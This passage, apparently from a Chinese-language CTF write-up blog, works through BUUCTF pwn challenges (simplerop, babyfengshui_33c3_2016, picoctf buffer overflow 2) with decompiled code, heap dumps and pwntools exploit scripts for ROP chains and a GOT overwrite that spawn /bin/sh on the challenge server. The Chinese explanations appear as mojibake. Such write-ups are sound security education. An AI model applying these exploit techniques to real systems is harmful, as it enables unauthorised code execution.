class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./simplerop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26293</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_bin_sh_addr = <span class="number">0x080EB590</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(bss_bin_sh_addr)</span><br><span class="line">payload += p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax) </span><br><span class="line">payload += p32(<span class="number">0xb</span>) </span><br><span class="line">payload += p32(pop_edx_ecx_ebx) </span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_bin_sh_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2B-babyfengshui-33c3-2016"><a href="#0x2B-babyfengshui-33c3-2016" class="headerlink" title="0x2B.babyfengshui_33c3_2016"></a>0x2B.babyfengshui_33c3_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec babyfengshui_33c3_2016 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/babyfengshui_33c3_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2, &amp;v0);</span><br><span class="line">      add(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="keyword">delete</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      display(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      update(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( byte_804B069 &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">add</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a1);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *v3 = s;</span><br><span class="line">  *(&amp;ptr + byte_804B069) = v3;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  input(*(&amp;ptr + byte_804B069) + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  update(byte_804B069++);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addå‡½æ•°ç”³è¯·äº†ä¸¤æ¬¡ï¼Œå…¶ä¸­æŠŠç¬¬ä¸€æ¬¡ç”³è¯·çš„ç©ºé—´å†™å…¥äº†ç¬¬äºŒæ¬¡ç”³è¯·çš„ç©ºé—´ï¼Œç¬¬äºŒæ¬¡ç”³è¯·çš„ç©ºé—´å¤§å°æ˜¯å›ºå®šçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> * s;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x7C</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deleteï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; byte_804B069 &amp;&amp; (&amp;ptr)[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr)[a1]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;ptr)[a1]);</span><br><span class="line">    (&amp;ptr)[a1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><p>freeå¹¶èµ‹å€¼ä¸º0.</p><p>displayï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">display</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; byte_804B069 &amp;&amp; *(&amp;ptr + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: %s\n&quot;</span>, *(&amp;ptr + a1) + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;description: %s\n&quot;</span>, **(&amp;ptr + a1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>updateï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; byte_804B069 &amp;&amp; (&amp;ptr)[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (*(&amp;ptr)[a1] + v3) &gt;= (&amp;ptr)[a1] - <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    input(*(&amp;ptr)[a1], v3 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­updateä¸­çš„ï¼š<code>if ( (*(&amp;ptr)[a1] + v3) &gt;= (&amp;ptr)[a1] - 1 )</code>ï¼Œè¿™é‡Œçš„åˆ¤æ–­æœ‰ä¸€äº›é—®é¢˜ï¼Œchunk0å’Œchunk0(name)å…¶å®ä¸ä¸€å®šç›¸é‚»çš„ï¼Œè¿™æ ·å°±æœ‰äº†æº¢å‡ºçš„å¯èƒ½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;ccccc&quot;</span>,<span class="string">&quot;ddddd&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80wx 0x804c000</span><br><span class="line">0x804c000:0x000000000x000000890x626262620x00000000 &lt;=chunk0</span><br><span class="line">0x804c010:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c020:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c030:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c040:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c050:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c060:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c070:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c080:0x000000000x000000000x000000000x00000089</span><br><span class="line">0x804c090:0x0804c0080x616161610x000000610x00000000 &lt;=chunk(0) name</span><br><span class="line">0x804c0a0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0b0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0c0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0d0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0e0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c110:0x000000000x000000890x646464640x00000064</span><br><span class="line">0x804c120:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c130:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><p>å¯¹äºchunk0æ¥è¯´å°±æ˜¯0x80c008+è¾“å…¥é•¿åº¦æ˜¯å¦å¤§äº0x804c08cã€‚</p><p>å€˜è‹¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;ccccc&quot;</span>,<span class="string">&quot;ddddd&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;11111&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œæ–°ç”³è¯·çš„chunk3å°±ä¼šåœ¨chunk1å’Œchunk2å‰é¢ï¼Œè€Œchunk3(name)åˆ™ä¼šåœ¨chunk1å’Œchunk2çš„åé¢ï¼Œè¿™æ ·å°±å¯ä»¥è¾“å…¥å¾ˆé•¿çš„æ•°æ®äº†ã€‚</p><p>ç„¶åå°±æ˜¯è¦†ç›–æŒ‡é’ˆä¸ºfree_gotçš„åœ°å€ï¼Œè¾“å‡ºï¼Œè®¡ç®—systemçš„åœ°å€ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&quot;./babyfengshui_33c3_2016&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25098</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyfengshui_33c3_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,length,name,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size of description: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">io.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">io.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&quot;naem&quot;</span>,<span class="string">&quot;ddddd&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x108+&quot;\x00&quot;*4+&quot;\x00\x00\x00\x89&quot;+&#x27;a&#x27;*0x80+&quot;\x00&quot;*4+&quot;\x00\x00\x00\x89&quot;+p32(elf.got[&#x27;free&#x27;])</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x198</span> + p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19c</span>,<span class="string">&quot;name&quot;</span>,payload)</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;free&quot;,free_addr)</span></span><br><span class="line"><span class="comment">#libc_base=free_addr-libc.dump(&quot;free&quot;)</span></span><br><span class="line"><span class="comment">#sys_addr=libc_base+libc.dump(&quot;system&quot;)</span></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x4</span>,p32(sys_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2C-picoctf-2018-buffer-overflow-2"><a href="#0x2C-picoctf-2018-buffer-overflow-2" class="headerlink" title="0x2C.picoctf_2018_buffer overflow 2"></a>0x2C.picoctf_2018_buffer overflow 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">win</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEF</span> &amp;&amp; a2 == <span class="number">0xDEADC0DE</span> )</span><br><span class="line">    result = (<span class="keyword">char</span> *)<span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·³è½¬çš„winè¿™ä¸ªå‡½æ•°çš„æ—¶å€™ä¸¤ä¸ªå‚æ•°éœ€è¦æ˜¯0xDEADBEEF å’Œ 0xDEADC0DE</p><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&quot;./PicoCTF_2018_buffer_overflow_2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27708</span>)</span><br><span class="line">win_addr = <span class="number">0x080485CB</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) 